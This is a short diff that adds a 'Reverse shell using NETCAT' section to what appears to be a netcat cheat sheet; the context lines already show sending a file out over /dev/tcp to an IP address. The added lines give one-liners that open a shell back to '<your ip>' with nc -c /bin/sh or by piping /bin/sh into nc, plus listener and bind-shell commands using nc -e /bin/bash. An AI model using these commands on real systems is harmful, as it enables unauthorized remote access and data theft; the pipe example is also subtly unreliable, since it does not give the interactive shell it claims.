@@ -40,3 +40,24 @@ On the sending box:
 cat file.txt > /dev/tcp/10.2.0.2/1111
 
 This method is useful for host that does not have NETCAT available.
+
+
+
+Reverse shell using NETCAT
+
+When shelled into the remote host using -c :
+
+nc -c /bin/sh <your ip> <any unfiltered port>
+
+You could even pipe BASH through NETCAT.
+
+/bin/sh | nc <your ip> <any unfiltered port>
+
+Then listen for the shell.
+
+nc -l -p <same unfiltered port> -vvv
+
+You can also listen using the -e with NETCAT.
+
+nc -l -p <any unfiltered port> -e /bin/bash
+
